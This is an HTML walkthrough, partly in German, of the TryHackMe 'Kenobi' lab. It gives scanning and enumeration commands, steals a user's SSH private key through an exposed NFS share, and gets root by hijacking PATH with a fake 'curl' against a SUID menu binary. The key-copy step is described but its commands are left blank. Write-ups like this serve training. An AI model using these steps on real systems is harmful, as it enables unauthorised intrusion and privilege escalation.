@@ -1,0 +1,286 @@
+<html>
+	<head>
+		<title>Kenobi</title>
+		<link rel="stylesheet" href="styles.css">
+	</head>
+	<h1>Tryhackme.com - Kenobi</h1>
+	<h3>Author: Uwe Hörber Datum: 19.01.2021</h3>
+
+<br>
+
+	<h1>the tasks</h1>
+
+<br>
+
+	<h3> Task 1 </h3>
+	Make sure you're connected to our network and deploy the machine
+<br>
+
+<br>
+	done
+<br>
+	<h3> Task 2</h3>
+
+<br>
+	Scan the machine with nmap, how many ports are open?
+<br>
+
+<br>
+	nmap -sV -sC {ip}
+<br>
+
+<br>
+	Answer: 7
+<br>
+
+<br>
+	<h3> Task 3 </h3>
+
+<br>
+	Folgendes Kommando soll ausgefuehrt werden 
+<br>
+
+<br>
+	<p>
+	nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.221.1
+<br>
+	</p>
+
+<br>
+	zeigt drei shares
+<br>
+
+<br>
+	answer: 3
+<br>
+
+<br>
+	<h3> Task 4 </h3>
+
+<br>
+	Wir sollen nun folgendes ausfuehren:
+<br>
+	
+<br>
+	<p>
+	smbclient //<ip>/anonymous
+<br>
+	</p>
+
+<br>
+	und werden gefragt welche Datei wir sehen
+<br>
+
+<br>
+	answer: log.txt
+<br>
+
+<br>
+	<h3> Task 5 </h3>
+
+<br>
+	we are asked to run the following command to download the logfile:
+<br>
+
+<br>
+	<p>
+	smbget -R smb://<ip>/anonymous
+<br>
+	</p>
+
+<br>
+	What port is FTP running on?
+<br>
+
+<br>
+	Wir oeffnen die log Datei und sehen die Antwort.
+<br>
+
+<br>
+	answer: 21
+<br>
+
+<br>
+	<h3> Task 6 </h3>
+
+<br>
+	Wir sollen folgendes ausfuehren:
+<br>
+
+<br>
+	<p>
+	nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.221.1
+<br>
+	</p>
+	
+<br>
+	answer: /var
+<br>
+
+<br>
+	<h3> Task 7 </h3>
+
+<br>
+	Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.
+<br>
+
+<br>
+	What is the version?
+<br>
+
+<br>
+	<p>
+	nc 10.10.221.1 21
+<br>
+	</p>
+
+<br>
+	answer: 1.3.5
+<br>
+
+<br>
+	<h3> Task 8 </h3>
+
+<br>
+	
+<br>
+
+<br>
+	We can use searchsploit to find exploits for a particular software version.
+<br>
+
+<br>
+	Searchsploit is basically just a command line search tool for exploit-db.com.
+<br>
+
+<br>
+	How many exploits are there for the ProFTPd running?
+<br>
+
+<br>
+
+<br>
+	<p> searchsploit proftpd </p>
+
+<br>
+	answer: 3
+<br>
+
+<br>
+	<h3> Task 9 und 10 </h3>
+	keine Antwort notwendig
+<br>
+
+<br>
+	Wir legen den private key des users jetzt in das /var verzeichnis, wo wir ihn dann mounten und lesen koennen.
+<br>
+
+<br>
+	<p>
+		
+<br>
+
+<br>
+	<h3> Task 11 </h3>
+
+<br>
+	Wir mounten das gefundene share:
+<br>
+
+<br>
+	<p>
+	mkdir /mnt/kenobi
+<br>
+	mount 10.10.221.1:/var /mnt/kenobi
+<br>
+	</p>
+	
+<br>
+	jetzt koennen wir unter /mnt/kenobi/tmp/id_rsa den private key von kenobi auslesen.
+<br>
+
+<br>
+	wir versuchen uns jetzt ueber ssh mit dem rsa key einzuloggen.
+<br>
+
+<br>
+	<p>
+	ssh -i id_rsa kenobi@10.10.221.1
+<br>
+	</p>
+
+<br>
+	und im Nutzerverzeichnis finden wir nun das flag.
+<br>
+
+<br>
+	<h3> Task 12 </h3>
+
+<br>
+	wir sollen nun folgenden Code ausfuehren:
+<br>
+
+<br>
+	<p>
+	find / -perm -u=s -type f 2>/dev/null
+<br>
+	</p>
+
+<br>
+	What file looks particularly out of the ordinary? 
+<br>
+
+<br>
+	answer: /usr/bin/menu
+<br>
+
+<br>
+	<h3> Task 13 </h3>
+
+<br>
+	Run the binary, how many options appear?
+<br>
+
+<br>
+	answer: 3
+<br>
+
+<br>
+	<h3> Task 14 </h3>
+
+<br>
+	wir fuehren nun folgendes aus:
+<br>
+
+<br>
+	<p>
+	strings /usr/bin/menu
+<br>
+	</p>
+
+<br>
+	hier sehen wir, dass curl genutzt wird.
+<br>
+
+<br>
+	wir kopieren jetzt eine shell und nennen diese curl um root zugang zu kriegen.
+<br>
+
+<br>
+	<p>
+	cd /tmp
+<br>
+	echo /bin/bash > curl
+<br>
+	chmod 777 curl
+<br>
+	export PATH=/tmp:$PATH
+<br>
+	</p>
+
+<br>
+	nun fuehren wir wieder /usr/bin/menu aus und waehlen die status variante. nun haben wir eine root shell und koennen das flag aus /root/root.txt auslesen.
+<br>
+
+<br>
+</html>
